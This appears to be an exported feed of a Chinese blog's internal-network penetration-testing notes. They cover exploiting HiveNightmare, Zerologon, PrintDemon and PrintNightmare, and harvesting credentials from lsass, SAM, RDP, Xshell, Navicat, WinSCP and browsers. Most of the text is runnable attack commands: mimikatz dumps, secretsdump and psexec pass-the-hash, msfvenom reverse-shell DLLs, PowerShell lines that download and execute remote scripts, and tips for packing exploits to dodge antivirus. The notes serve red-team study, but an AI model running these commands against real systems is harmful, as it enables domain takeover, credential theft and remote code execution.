<p>2021年7月公布漏洞(CVE-2021-36934), 由于Windows中多个系统文件的访问控制表(ACL)过于宽松,使得任何标准用户都可以从系统影卷副本中读取包括SAM、SYSETM、SECURITY在内的多个系统文件。拿到这几个文件之后就可以进行本地破解,拿到用户的NTLM hash进行PTH攻击或者直接本地爆破密码。</p>
<p>该漏洞影响WIN10 Version 1809发布以来的所有Windows版本,包括Windows11, 被称为HiveNightmare</p>
<p>漏洞利用条件有两个:<br>
<code>系统保护开启(默认开启)</code><br>
<code>系统中创建有还原点</code><br>
三个系统文件位置为:</p>
<pre><code>C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
</code></pre>
<p>查看是否存在漏洞：<br>
标准用户执行：</p>
<pre><code>icacls C:\Windows\System32\config\SAM

若存在漏洞输出：“BUILTIN\Users:(I)(RX)”
</code></pre>
<p>先下载HiveNightmare.exe然后上传到靶机中然后直接执行就会在当前目录输出SAM,SYSTEM,SECURITY三个文件(exe上去就直接被杀, 但是HiveNightmare项目里的ps文件就没报报毒)使用Impacket项目中的secretsdump.py导出SAM中的哈希值</p>
<pre><code>python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL
</code></pre>
<p><strong>8.4 Zerologon 域内提权</strong></p>
<p>Zerologon(CVE-2020-1472)是Netlogon远程协议的一个特权漏洞的提升, 可以在不提供任何凭据的情况下通过身份验证, 实现域内提权。</p>
<p>漏洞常见的利用方法就是调用Netlogon中的RPC函数NetrServerPasswordSet2来重置域控制器账户的密码。注意这里重置的是DC机器账户密码(详细的域内用户组参考域内信息收集,这里的机器账户就是域成员主机组内的账户Domain Computers), 这个域控制器主机账户密码由系统随机生成(密码强度是120字符,且会定时更新).</p>
<p>在域内的机器账户以机器名+$也是一种域用户, 它是不允许登录的, 所以不能直接进行远程登录域控制器, 但是域控制器的机器账户在默认下拥有DCSync权限, 因此可以通过DCSync攻击导出域管理员密码的哈希, 从而获取域控权限。</p>
<p><code>密码重置为空:</code><br>
可以到项目CVE-2020-1472获取poc文件:</p>
<p>运行cve-2020-1472-exploit.py 将域控制器密码重置为空</p>
<pre><code>python3 cve-2020-1472-exploit.py [DCName] [DCIP]
python3 cve-2020-1472-exploit.py owa 192.168.52.138 

使用secretsdump.py以空密码连接上域控, 并导出管理员哈希值
python3 secretsdump.py god.org/owa\$@192.168.52.138 -just-dc-user &quot;god\administrator&quot; -no-pass 

拿到管理员哈希之后对域控制器执行PTH哈希传递攻击, 利用成功则获取到域控的SYSTEM权限
python3 psexec.py god.org/administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:8a963371a63944419ec1adf687bb1be5
</code></pre>
<p><img src="https://dydydy123.github.io/post-images/1681277890374.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681277896960.png" alt="" loading="lazy"></p>
<p>这里的cve-2020-1472-exploit.py和secretsdump.py因为考虑到靶机上可能没有python,即使有python也不一定有需要的依赖, 所以我就直接在本地使用pyinstaller将.py打包为.exe方便直接上传后运行</p>
<pre><code>python -m pip install --upgrade pip
python -m pip install pyinstaller
Python -m pip install impacket
 
pyinstaller -F cve-2020-1472-exploit.py 
pyinstaller -F secretsdump.py
</code></pre>
<p>执行完毕之后可以在当前目录的dist下面找到有.py打包的.exe文件(exploite生成的exe文件会被defender直接杀掉,但是secretsdump生成的exe就没问题)</p>
<p>此外也可以使用mimikatz直接进行攻击(有些mimikatz版本没有zerologon模块,可以到这里下载mimikatz_trunk.zip:<br>
<code>https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</code></p>
<pre><code>mimikatz.exe &quot;lsadump::zerologon /target:192.168.30.10 /ntlm /null /account:DC$/exploite&quot; exit
</code></pre>
<p><code>恢复域控密码:</code></p>
<p>https://blog.csdn.net/Captain_RB/article/details/120643838</p>
<p>在攻击结束之后需要及时恢复域控的密码, 否则可能导致域控制器脱域。主要原因是域控NTDS.dit中存储的密码和域控本地注册表中存储的密码不一致</p>
<p>导出注册表（使用注册表中的哈希还原之前被制空的哈希）：</p>
<pre><code>reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
</code></pre>
<p>导出后复制到本地, 使用secretsdump.py导出注册表中的哈希值,重置机器前的机器用户密码(密码前面有plain_password_hex:,显示的是HEX编码后的结果)</p>
<pre><code>python3 secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1681279262586.png" alt="" loading="lazy"></figure>
<pre><code>python3 restorepassword.py god.org/owa@owa -target-ip 192.168.52.138 -hexpass 5492e8fdaeef13b8bad98df923afb2616287275ad52f8477f49340f426019a0b74fa9b3029ce32c4a6dfa9936376a974c00e519e3b20f1788478ea1e4a361d7eff8edce69a07b257ed0c2a69aa4cb100bffaf8d2779b81f1a91d6cd438a021c831546186f16ddb4d433df1f79ad6af813587ef9ec3243cd8b837c840f953828d1aa3ce569ad082ceada22e053ea0fd918cba162bfdeb9f16dfe90f551bcf55534aa11e060e77bb32dce728d09616abe1a7c633e40965067d1e9c59393435aa2fa6fce275c695de4d4826ae8a8bcbafdcd73bba9463f4a931c83f5f42dad95008b697cbc0407c104c12324b21fd6af8c3

Mimikatz：
lsadump::postzerologon /traget:god.org /account:owa$

</code></pre>
<p><img src="https://dydydy123.github.io/post-images/1681281304228.png" alt="" loading="lazy"><br>
执行成功后再次链接失败：<br>
<img src="https://dydydy123.github.io/post-images/1681281313758.png" alt="" loading="lazy"></p>
<h1 id="9print-spooler提权漏洞">9.Print Spooler提权漏洞</h1>
<p><strong>9.1 PrintDemon</strong><br>
2020年5月12日更新安全补丁，公开了PrintDemon本地提权漏洞(CVE-2020-1048)</p>
<p>在Windwos添加打印机是需要设置打印机的端口,如LPT1端口、USB端口、网络端口和文件等。如果端口设置为文件路径，那么打印的内容就会被输出到文件。</p>
<p>这个漏洞简单来说就是如果在标准用户权限下进行打印服务，将数据打印到指定的系统文件中，如果权限不足就会打印失败。</p>
<p>而微软为了应对打印过程的异常和中断，引入了假脱机打印机制。</p>
<p>假脱机打印会在系统重启后使用SYSTEM权限恢复之前未执行完的打印任务，这时候如果指定端口为文件，就会导致任意文件写入。</p>
<p>所以通过介绍了解PrintDemon漏洞可以做什么了–任意文件写入,那么怎么通过这个进一步完成RCE呢?</p>
<p>1.DLL劫持文件写入<br>
2.系统SYSTEM权限自启任务的exe文件替换(教程中就是直接替换了TestSvc服务的二进制文件)<br>
3.个人思维拓展: 之前看注册表的时候有发现每个注册表都是一个文件, 那么是不是可以通过文件修改直接修改注册表完成服务的注册表劫持从而加载恶意payload拿到SYSTEM的会话</p>
<p><code>Invoke-PrintDemon.psl利用：</code></p>
<pre><code>Import-Module .\Invoke-PrintDemon.psl

Invoke-PrintDemon -PrinterName '指定创建的打印机名称' -Portname 'C:\??\name.exe' -Base64code '&lt;PayloadBase64&gt;'

PayloadBase64：
https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')
</code></pre>
<p><code>msf利用：</code></p>
<pre><code>use /windows/local/cve_2020_1048_printerdemo 

set session 1
set verbose true
set restart_target true
set payload windows/x64/meterpreter/reverse_tcp
set disablepayloadhandler false
set lhost 192.168.52.138
set lport 4444
run
</code></pre>
<p><strong>9.2 PrintNightmare</strong><br>
PrintNightmare有两种变体,一种是权限提升(CVE-2021-1675,2021年6月8日推出微软补丁), 另一种允许远程代码执行(CVE-2021-34527,在1675补丁发布后爆出)</p>
<p>标准用户可以通过PrintNightMare漏洞绕过PfcAddPrinterDriver的安全验证并在打印服务器中安装恶意的驱动程序(如果当前所控制用户在域中那么可以连接到DC PrintSpooler服务中安装的恶意驱动从而接管整个域)。</p>
<p><code>1.CVE-2021-1675</code><br>
https://github.com/cube0x0/CVE-2021-1675<br>
SharpPrintNightMare.exe需编译：</p>
<pre><code>SharpPrintNightMare.exe C:\temp\reverse_http_80.dll
</code></pre>
<p><code>2.CVE-2021-34527</code><br>
先使用msfvenom生成dllpayload，并开启监听。</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.92.128 LPORT=80 -f dll -o /tmp/123.dll

监听需设置：
set AutoRunScript migrate -f
</code></pre>
<p>kali中开启smb服务,SMB服务配置文件/etc/samba/smb.conf修改为如下内容:</p>
<pre><code>[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445
 
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
</code></pre>
<pre><code>开启服务：
service smbd start

域内被控制主机查看smb服务开启情况
dir \\192.168.52.132\smb
</code></pre>
<pre><code>└─# python3 CVE-2021-1675.py                                      
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share [pDriverPath]

MS-PAR PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.

positional arguments:
  target                [[domain/]username[:password]@]&lt;targetName or address&gt;
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'
  pDriverPath           Driver path. Example 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'

</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第3章--端口转发与内网代理]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-duan-kou-zhuan-fa-yu-nei-wang-dai-li/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-duan-kou-zhuan-fa-yu-nei-wang-dai-li/">
        </link>
        <updated>2023-04-03T01:14:27.000Z</updated>
        <content type="html"><![CDATA[<h1 id="端口转发">端口转发</h1>
<p><strong>1.目标机器有公网ip，但是端口被防火墙限制</strong><br>
博客：https://www.zhuguodong.com/?id=486<br>
lcx.exe与portmap工具：https://github.com/Brucetg/Pentest-tools<br>
端口转发</p>
<p>winserver上执行 （记得入站规则和开启rdp）</p>
<pre><code>lcx.exe -tran 4444 127.0.0.1 3389
</code></pre>
<p>kali</p>
<pre><code>rdesktop 172.31.171.152:4444
</code></pre>
<p><strong>2..目标机器有公网ip，将内网其他主机端口映射到跳板机某个端口</strong><br>
<code>LCX利用：</code></p>
<pre><code>ubuntu: （内网）
nc -lvnp 22
</code></pre>
<p>将内网某主机22端口（此处为ubuntu）映射到本机4444</p>
<pre><code>win server （DMZ）
lcx.exe -tran 4444 10.10.10.15 22
</code></pre>
<pre><code>kali （公网）
nc 172.31.171.152 4444
</code></pre>
<p><code>MSFShell利用：</code></p>
<pre><code>portfwd add -l 6666 -r 目标ip -p 目标端口
portfwd delete -l 6666 -r 192.168.159.154 -p 80
portfwd list   列出所有端口转发
add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。
</code></pre>
<p><strong>3.目标无公网IP，将内网某主机端口映射到VPS某个端口</strong></p>
<p>在受害机上执行：</p>
<pre><code>lcx.exe -slave 192.168.1.4(攻击机IP) 4444 127.0.0.1 3389
这条命令的意思就是将本机的 3389 端口转发到攻击机的 4444 端口上
</code></pre>
<p>之后在攻击机上执行（公网kali vps）：</p>
<pre><code>./portmap -m 2 -p1 4444 -h2 192.168.1.4 -p2 5555
这条命令的意思就是将本地4444端口接收的数据转发到5555端口
</code></pre>
<pre><code>rdesktop 192.168.1.4:5555
</code></pre>
<h1 id="内网代理">内网代理</h1>
<p><strong>FRP使用：</strong><br>
多级代理：<br>
<img src="https://dydydy123.github.io/post-images/1685946141094.png" alt="" loading="lazy"><br>
https://www.viewofthai.link/2022/11/15/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8e%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86/</p>
<h1 id="端口复用">端口复用</h1>
<p><img src="https://dydydy123.github.io/post-images/1685948865811.png" alt="" loading="lazy"><br>
https://blog.csdn.net/yang1234567898/article/details/125173701</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第2章--内网资源探测--获取常见应用软件凭据]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-huo-qu-chang-jian-ying-yong-ruan-jian-ping-ju/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-huo-qu-chang-jian-ying-yong-ruan-jian-ping-ju/">
        </link>
        <updated>2023-04-02T12:39:24.000Z</updated>
        <content type="html"><![CDATA[<p>为了扩大可访问的范围，测试人员会尝试搜搜各种常见的密码存储位置，像很多的软件就会存储密码。<br>
<strong>1.获取RDP保存的凭证</strong><br>
经常使用RDP远程桌面连接远程服务器的用户可能勾选了保存连接凭证的选项，以便快速的身份验证。这些凭证使用数据保护API以加密形式存储在Windows的凭证管理器中，在<code>%USERPROFILE%\AppData\Local\Microsoft\Credentials</code>目录</p>
<pre><code>cmdkey /list #查看当前保存的凭据
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*   #遍历Credentials目录下保存的历史连接凭据数据
</code></pre>
<p>Mimikatz导出Credentials目录下保存的历史连接凭据（加密的RDP凭据）：</p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot; exit    #使用mimikatz解析指定的连接凭据
</code></pre>
<p>得到pdData就是凭据的加密数据，guidMasterkey是该凭据的GUID，记录guidMasterkey。执行以下命令：</p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit   #找到与guidMasterKey(GUID)相关联的MasterKey
</code></pre>
<p>记录MasterKey，执行以下命令：</p>
<pre><code>mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D/masterkey:c33afd208e2f69c975b90546deedc8091c47eab49fb96a9c3092373f276a85dcf90d41e072eb4a105599244876b686c145f5bd2f00ffc12cac2e7faace661733&quot; exit
</code></pre>
<p>使用MasterKey值破解指定的凭据文件DFBE70A7E5CC19A398EBF1B96859CE5D，获得RDP明文凭据。</p>
<p><strong>2.获取Xahell保存的凭证</strong></p>
<p>Xshell会将服务器连接信息保存在Session目录下的.xsh文件中, 如果用户在连接的时候勾选了记住用户名/密码, 该文件会保存远程服务器连接的用户名和结果加密后的密码</p>
<pre><code>Xshell版本	.xsh文件路径
Xshell5	%USERPROFILE%\Documents\NetSarang\Xshell\Sessions
Xshell6	%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions
Xshell7	%USERPROFILE%\Documents\NetSarang Computers\7\Xshell\Sessions
</code></pre>
<p>获取Xshell保存的凭据：</p>
<pre><code>SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang\Xshell\Sessions&quot;   #获取Xshell5的账密
SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions&quot;  #获取Xshell6的账密
</code></pre>
<p>Xshell5和6可以通过工具SharpDecryptPwd解密, 除此之外该工具还可以解密Navicate、TeamViewer、FileZilla、WinSCP、Xmangager系列产品。Xshell7后的版本通过上面命令获得的密码为一串乱码,只能使用星号密码查看器直接查看密码。</p>
<p><strong>3.获取FileZilla保存的凭证</strong><br>
FileZilla用于FTP连接, 它会将FTP登录凭据以base64密文的格式保存在<code>%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml</code>文件中, 可以使用SharpDecryptPwd直接一键导出FileZilla保存的凭据。<br>
&lt;\User&gt;节点记录了FTP登录用户，&lt;\Pass&gt;节点记录Base64编码的用户密码。</p>
<p><code>SharpDecryptPwd</code>--https://github.com/uknowsec/SharpDecryptPwd</p>
<pre><code>SharpDecryptPwd.exe -FileZilla
</code></pre>
<p><strong>4.获取Navicat保存的凭证</strong><br>
数据库类型	凭据存储路径(注册表)</p>
<pre><code>Mysql	HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Server\&lt; Connetion Name&gt;
MariaDB	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;
MongoDB	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;
SQL SERVER	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;
Oracle	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;
PostgreSQL	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;
SQLite	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion Name&gt;
</code></pre>
<p>Navicat的注册表中记录了保存密码的连接数据, 包括IP,用户名,密码,连接数据库名,数据库类型等, 其中密码字段是结果可你算法加密后再保存的, 其中Navicat&lt;=11版本和Navicat&gt;=12版本分别使用不同的加密算法。</p>
<pre><code>SharpDecryptPwd.exe -NavicatCrypto
</code></pre>
<p><strong>5.获取浏览器保存的凭证</strong></p>
<pre><code>hack-browser-data.exe
</code></pre>
<p>会将相关的数据导出到当前目录下的./result目录下</p>
<p><strong>6.获取WinSCP保留的登录凭据</strong><br>
WinSCP默认安装在<code>C:\Program Files (x86)\WinSCP</code>，其用户凭证可以保存在注册表或者配置文件中。</p>
<p>配置文件则在<code>C:\Program Files (x86)\WinSCP\WinSCP.ini</code>或<br>
<code>C:\Users\USERNAME\AppData\Local\VirtualStore\Program Files (x86)\WinSCP\WinSCP.ini</code></p>
<pre><code>解密工具或脚本：

https://bitbucket.org/knarf/winscppwd/downloads/winscppwd.exe

https://raw.githubusercontent.com/anoopengineer/winscppasswd/master/main.go

https://raw.githubusercontent.com/YuriMB/WinSCP-Password-Recovery/master/src/main/java/Main.java
</code></pre>
<pre><code>注册表查询命令
查询注册表中winscp保存的密文

shell reg query &quot;HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions&quot;shell reg query &quot;HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@192.168.80.164&quot;


使用winscppwd.exe进行解密
winscppwd.exe root 192.168.80.164 A35C4A54D144F65B7DF0E8F42E3333286D656E726D6A6472646C726D6A682833332EFA7A248229B891A201911C3F588380D6

Winscppwd.exe WinSCP.ini


msf模块
meterpreter &gt; run post/windows/gather/credentials/winscp
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第2章--内网资源探测--用户凭证收集]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-yong-hu-ping-zheng-shou-ji/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-yong-hu-ping-zheng-shou-ji/">
        </link>
        <updated>2023-04-02T09:12:46.000Z</updated>
        <content type="html"><![CDATA[<p><strong>SAM文件</strong><br>
SAM文件是Windows用户的账户数据库,位于%SystemRoot%\System32\Config目录中,所有本地用户的用户名, 密码哈希等信息都被存放在这个数据库文件中。（本地用户）</p>
<p><strong>lsass.exe进程</strong><br>
lsass.exe是Windows的一个系统进程, 用于实现系统的安全机制, 主要用于本地安全和登录策略. 通常在用户输入密码完成验证开始登录用户的时候, 登录的域名, 用户名,登录凭据等信息都会存储在lsass.exe的进程空间中, 用户的密码则是通过WDigest和Tspkg模块调用后使用可逆的加密算法加密后存储在内存中。（登录过的用户，包含域用户）</p>
<p>在用户登录的时候用户的明文密码会通过WDigest和Tspkg模块调用后再加密存储在lsass.exe的内存中, 但是为了防止用户明文密码在内存中泄露, 微软在2014年5月发布了KB2871997补丁, 关闭了WDigest功能, 禁止从内存中读取明文密码, 且Windows Server 2012及以上版本默认关闭WDigest功能。</p>
<p>可修改注册表开启WDigest功能，当用户重新登录后即可重新获取明文密码。</p>
<pre><code>开启WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

关闭WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
</code></pre>
<p><strong>1.凭证收集--在线读取lsass.exe进程内存</strong></p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit 
#从lsass.exe进程的内存中读取当前已登录用户的凭据(需要管理员身份执行,否则会DebugPrivilege权限获取失败)
#privilege::debug提升至DebugPrivilege权限
#sekurlsa::logonpasswords导出用户凭据
</code></pre>
<p><s>域用户似乎无法直接读取，需要本地用户</s></p>
<p><strong>2.凭证收集--离线读取lsass.exe进程内存</strong></p>
<p>procdump-配合-minikatz</p>
<p>将lsass.exe的进程内存转储，将内存文件导出到本地后通过mimikatz进行离线读取，用于转存进程内存的工具有很多，如Out Mini dump.psl，Procdump，SharpDump等。甚至可以手工加载系统自带的comsvcs.dll来实现内存转储。<br>
这里使用微软官方Procdump工具。</p>
<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
#加载内存文件
sekurlsa::minidump lsass.dmp
#导出用户凭证
sekurlsa::logonPassword full
</code></pre>
<p><strong>3.在线读SAM文件</strong></p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit
#privilege::debug提升至DebugPrivilege权限
#token::elevate提示SYSTEM权限
#读取本地sam
</code></pre>
<p><strong>4.离线读SAM文件</strong><br>
为了提高SAM文件的安全性以防止离线破解, Windows会对SAM文件使用秘钥进行加密, 这个秘钥存储在SYSTEM文件中, 与SAM位于同一个目录下.</p>
<p>在系统运行时,SAM和SYSTEM这两个文件是被锁定的, 所以需要借助一些工具来实现。</p>
<p><code>4.1PowerSplit--Invoke-NinjaCopy.ps1</code><br>
本地：</p>
<pre><code>Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SAM' -LocalDestination 'C:\Users\h0cksr\Desktop\SAM'
Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SYSTEM' -LocalDestination 'C:\Users\h0cksr\Desktop\SYSTEM'
</code></pre>
<p>远程：</p>
<pre><code>powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SAM' -LocalDestination 'C:\SAM'&quot;  
powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://IP/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SYSTEM' -LocalDestination 'C:\SYSTEM'&quot;  
</code></pre>
<p><code>4.2通过HiveNightmare漏洞(CVE-2021-36934)</code><br>
从系统卷影副本中访问和转储SAM,SYSTEM文件。<br>
系统卷影副本,需要创建有系统还原点, 其影响范围为Windwos10 Version 1809以来发布的全部版本, 包括Win11在内。<br>
1.</p>
<pre><code>icacls C:\Windows\System32\config\SAM    #在一般用户权限下执行即可, 若是输出&quot;BUILTIN\Users:(I)(RX)&quot;则表示系统易受攻击
</code></pre>
<p>2.下载HiveNightmare.exe然后将其上传到靶机, 直接执行HiveNightmare.exe就会在当前目录下导出生成SAM,SYSTEM,SECURITY三个文件<br>
https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe</p>
<p>3.运行Impacket的secretsdump.py导出SAM文件中的哈希值</p>
<pre><code>python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL
</code></pre>
<p><code>4.3在管理员权限下通过保存注册表的方式导出</code></p>
<pre><code>reg save HKEY_LOCAL_MACHINE\SAM\SAM sam.hive    #导出SAM注册表
reg save HKEY_LOCAL_MACHINE\SYSTEM system.hive  #导出SYSTEM注册表

mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit  #使用mimikatz读取SAM文件内容
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第2章--内网资源探测--端口扫描--msf探测--端口Banner信息]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-duan-kou-sao-miao/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-duan-kou-sao-miao/">
        </link>
        <updated>2023-03-31T10:51:10.000Z</updated>
        <content type="html"><![CDATA[<p><strong>1.利用Telnet探测端口</strong><br>
<code>telent &lt;IP&gt; &lt;Port&gt;</code></p>
<p><strong>2.nmap</strong></p>
<p><code>nmap -p 端口号</code></p>
<pre><code>参数  说明
-sT TCP连接扫描
-sS TCP SYN扫描(半开扫描), 需要root权限
-sF TCP FIN扫描
-sN TCP 空扫描
-sX TCP 圣诞树扫描
-sA TCP ACK扫描
-sU UDP 扫描, 结果不大可靠
-sP ping扫描,nmap端口扫描的时候默认就是使用ping扫描
只有主机存活, Nmap才会继续扫描
此外还有一些参数：

参数  说明
-sR RPC扫描
-sV 版本扫描
-b  FTP代理扫描
-P0 扫描前不ping主机
-v  显示详细扫描过程
-p  指定扫描端口
-O  操作系统探测
-A  全面系统探测,启用脚本检测、扫描等
-sC 根据端口识别的服务，调用默认脚本
--script=脚本名称   使用脚本引擎, 有多种功能的脚本,如
漏洞扫描、漏洞利用、目录扫描等功能
</code></pre>
<p><strong>3,powershell端口扫描</strong></p>
<p>nishang</p>
<p>设置权限<br>
<code>Set-ExecutionPolicy RemoteSigned</code><br>
加载模块<br>
<code>Import-Module .\nishang.psm1</code><br>
获取模块<br>
<code>Get-Command -Module nishang</code><br>
对某个网段的主机进行端口扫描<br>
<code>Invoke-PortScan -StartAddress 192.168.52.1 -EndAddress 192.168.52.138 -ResolveHost -ScanPort</code></p>
<p>远程加载扫指定端口<br>
<code>powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://192.168.92.1/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.92.1 -EndAddress 192.168.92.30 -ResolveHost -ScanPort -Port 80,88,135,139,443,445,3306,3389,8080&quot;</code></p>
<p><strong>4.msf探测内网</strong><br>
MetaSploite的auxiliary/scanner中存放了许多后渗透扫描功能模块。</p>
<p>msf-NetBIOS扫描存活主机：</p>
<pre><code>msf5 exploit(multi/handler) &gt; use auxiliary/scanner/netbios/nbname 
msf5 auxiliary(scanner/netbios/nbname) &gt; set rhosts 192.168.52.0/24
msf5 auxiliary(scanner/netbios/nbname) &gt; run
</code></pre>
<p>cs--socks代理--msf端口扫描：<br>
1.<br>
<img src="https://dydydy123.github.io/post-images/1678890359645.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1678890384236.png" alt="" loading="lazy"><br>
2.</p>
<pre><code>端口扫描
use auxiliary/scanner/portscan/tcp
基本设置
show options
高级设置
show advanced 
setg Proxies socks4:192.168.159.128:36428

</code></pre>
<p><strong>5.端口Banner信息</strong><br>
端口中的Banner往往会泄露重要信息，比如得到软件开发商，软件型号，服务类型，版本号这些信息（主要是最后两个）</p>
<pre><code>nc ip port
telnet ip port
nmap --script=banner -Pn 127.0.0.1/24
nmap -A -Pn 127.0.0.1/24
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第2章--内网资源探测--主机发现]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-zhu-ji-fa-xian/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-zhu-ji-fa-xian/">
        </link>
        <updated>2023-03-31T06:35:16.000Z</updated>
        <content type="html"><![CDATA[<p><strong>发现内网存活主机</strong><br>
可通过，ICMP，NetBOIOS，UDP，ARP，SNMP，SMB等多种协议。</p>
<p><strong>1.基于ICMP发现存活主机</strong><br>
ICMP为TCP/IP协议簇的子协议，用于网络层通讯，及IP主机与路由器之间传递控制信息，提供可能发生在通信环境中的各种错误反馈，管理员可以通过反馈的信息对发生的问题进行诊断。</p>
<p>通过循环对某个网段中所有IP进行ping（ICMP协议）操作。能够ping通的IP及存活主机。<br>
<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.0.%I | findstr &quot;TTL=&quot;</code></p>
<p><strong>2.基于NetBIOS (网络基本输入/输出系统)协议探测主机（应用层）</strong><br>
